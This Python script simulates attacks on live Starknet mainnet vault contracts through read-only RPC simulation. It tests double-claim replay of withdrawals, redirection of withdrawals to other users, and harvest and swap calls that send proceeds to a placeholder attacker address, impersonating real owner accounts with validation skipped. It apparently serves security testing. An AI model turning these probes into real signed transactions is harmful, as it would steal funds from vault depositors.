#!/usr/bin/env python3
"""Extended simulations: double-claim replay + harvest/swap beneficiary abuse tests.

Read-only (starknet_simulateTransactions, SKIP_VALIDATE). Nothing is signed/sent.
"""
import json
import sys

from rpc import felt, rpc, selector

CARTRIDGE = "https://api.cartridge.gg/x/starknet/mainnet"

AC_STRK = "0x00541681b9ad63dff1b35f79c78d8477f64857de29a27902f7298f7b620838ea"
AC_USDC = "0x016912b22d5696e95ffde888ede4bd69fbbc60c5f873082857a47c543172694f"
S_STRK = "0x020d5fc4c9df4f943ebb36078e703369c04176ed00accf290e8295b659d2cea6"
S_USDC = "0x04937b58e05a3a2477402d1f74e66686f58a61a5070fcc6f694fb9a0b3bae422"
S_ETH = "0x9d23d9b1fa0db8c9d75a1df924c3820e594fc4ab1475695889286f3f6df250"
S_ETH_XL = "0x9140757f8fb5748379be582be39d6daf704cc3a0408882c0d57981a885eed9"

ATTACKER = "0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcd"
AC_OWNER = "0x3495dd1e4838aa06666aac236036d86e81a6553e222fc02e70c2cbc0062e8d0"
S_OWNER = "0x55d39827894c40f04fe3a314ad013bf9bc5220f7eb6cd8863212dcba6c0e16e"
STRK = "0x04718f5a0fc34cc1af16a1cdee98ffb20c31f5cd61d6ab07201858f4287c938d"
USDC = "0x053c91253bc9682c04929ca02ed00b3e423f6710d2ee7e0d5ebb06f3ecf368a8"
ETH = "0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7"

TRANSFER_SEL = selector("transfer")
TRANSFER_FROM_SEL = selector("transferFrom")


def u256(v):
    return [hex(v & ((1 << 128) - 1)), hex(v >> 128)]


def enc_route(token_from, token_to, exchange, percent=10000, extra=None):
    extra = extra or []
    return [felt(token_from), felt(token_to), felt(exchange), hex(percent), hex(len(extra))] + [felt(x) for x in extra]


def enc_swap(token_from, from_amount, token_to, to_amount, to_min, beneficiary, fee_bps, fee_recipient, routes):
    cd = [felt(token_from)] + u256(from_amount) + [felt(token_to)] + u256(to_amount) + u256(to_min)
    cd += [felt(beneficiary), hex(fee_bps), felt(fee_recipient), hex(len(routes))]
    for r in routes:
        cd += r
    return cd


def enc_claim(cid, claimee, amount):
    return [hex(cid), felt(claimee), hex(amount)]


def get_random_sender():
    blk = rpc("starknet_getBlockWithTxs", ["latest"], endpoint=CARTRIDGE)
    for t in blk.get("transactions", []):
        if t.get("type") == "INVOKE" and t.get("sender_address"):
            return t["sender_address"]
    raise RuntimeError("no sender")


def simulate(sender, calls, flags=("SKIP_VALIDATE", "SKIP_FEE_CHARGE")):
    calldata = [hex(len(calls))]
    for to, entry, args in calls:
        calldata += [felt(to), selector(entry), hex(len(args))] + [
            felt(a) if isinstance(a, str) and a.startswith("0x") else hex(a) for a in args
        ]
    tx = {
        "type": "INVOKE",
        "version": "0x1",
        "sender_address": felt(sender),
        "calldata": calldata,
        "signature": [],
        "nonce": rpc("starknet_getNonce", ["latest", felt(sender)], endpoint=CARTRIDGE),
        "max_fee": "0x0",
    }
    return rpc(
        "starknet_simulateTransactions",
        {"block_id": "latest", "transactions": [tx], "simulation_flags": list(flags)},
        endpoint=CARTRIDGE,
    )


def analyze(sim):
    trace = sim.get("transaction_trace", {})
    ex = trace.get("execute_invocation", {})
    if ex.get("revert_reason"):
        return {"status": "REVERTED", "revert": str(ex["revert_reason"])[:800]}
    lines = []

    def walk(node, d=0):
        if not isinstance(node, dict):
            return
        lines.append(
            {
                "depth": d,
                "selector": node.get("entry_point_selector", ""),
                "contract": node.get("contract_address", ""),
                "calldata": node.get("calldata", []),
            }
        )
        for c in node.get("calls", []) or []:
            walk(c, d + 1)

    walk(ex)
    transfers = [l for l in lines if l["selector"] in (TRANSFER_SEL, TRANSFER_FROM_SEL)]
    return {"status": "SUCCESS", "n_calls": len(lines), "transfers": transfers, "calls": lines[:40]}


def main():
    sender = get_random_sender()
    results = {"random_sender": sender}
    # A. double-claim replay: AC_owner holds a Sensei_STRK / Sensei_USDC position
    for label, vault in [("S_STRK", S_STRK), ("S_USDC", S_USDC)]:
        calls = [(vault, "withdraw_zklend", [hex(1), hex(0), felt(AC_OWNER)])] * 2
        try:
            r = simulate(AC_OWNER, calls)
            results[f"double_claim_{label}_from_AC_owner"] = analyze(r[0])
        except Exception as e:  # noqa: BLE001
            results[f"double_claim_{label}_from_AC_owner"] = {"status": "SIM_ERROR", "error": str(e)[:400]}
    # B. basis test: random sender, receiver = AC_owner (has a position)
    for label, vault in [("S_STRK", S_STRK), ("S_USDC", S_USDC)]:
        try:
            r = simulate(sender, [(vault, "withdraw_zklend", [hex(1), hex(0), felt(AC_OWNER)])])
            results[f"receiver_basis_{label}_random_caller"] = analyze(r[0])
        except Exception as e:  # noqa: BLE001
            results[f"receiver_basis_{label}_random_caller"] = {"status": "SIM_ERROR", "error": str(e)[:400]}
    # C. harvest with malicious beneficiary on AC_STRK (claim empty -> expect revert at claim step)
    swap = enc_swap(STRK, 10**18, USDC, 0, 0, ATTACKER, 0, "0x0", [])
    for label, vault, entry, args in [
        ("AC_STRK harvest attacker-beneficiary", AC_STRK, "harvest", [*enc_claim(0, AC_STRK, 0), hex(0), *swap]),
        ("S_USDC harvest attacker-beneficiary", S_USDC, "harvest",
         [felt(AC_STRK), *enc_claim(0, S_USDC, 0), hex(0), felt(AC_STRK), *enc_claim(0, S_USDC, 0), hex(0), *swap]),
        ("S_USDC swap attacker-beneficiary", S_USDC, "swap", [felt(USDC), felt(USDC), *swap]),
        ("S_USDC unwind_dapp2 attacker-beneficiary", S_USDC, "unwind_dapp2", [hex(10000), *swap]),
    ]:
        try:
            r = simulate(sender, [(vault, entry, args)])
            results[label] = analyze(r[0])
        except Exception as e:  # noqa: BLE001
            results[label] = {"status": "SIM_ERROR", "error": str(e)[:400]}
    print(json.dumps(results, indent=1))


if __name__ == "__main__":
    main()
